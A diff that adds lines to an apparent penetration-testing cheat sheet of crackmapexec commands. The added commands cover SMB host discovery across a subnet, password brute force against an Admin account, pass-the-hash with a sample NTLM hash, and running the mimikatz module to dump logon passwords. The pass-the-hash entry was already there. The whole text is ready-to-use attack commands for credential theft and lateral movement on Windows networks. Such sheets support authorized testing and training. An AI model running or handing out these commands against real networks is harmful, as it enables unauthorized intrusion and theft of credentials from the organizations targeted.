@@ -1,3 +1,17 @@
+[Host discover]
+crackmapexec smb 192.168.1.1/24
+
+[Brute force]
+crackmapexec smb 192.168.1.1/24 -u Admin -p Pass123 
+
+[Brute force with hashes]
+crackmapexec smb 192.168.1.1/24 -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B
+
+[Equivalent to "sekurlsa::logonpasswords" via mimikatz]
+crackmapexec smb 192.168.1.1/24 -u Administrator -p Password1 -M mimikatz
+
 [Pass the hash]
 crackmapexec smb 10.10.10.100 -u user -H [hash-ntlm]
+
+
 
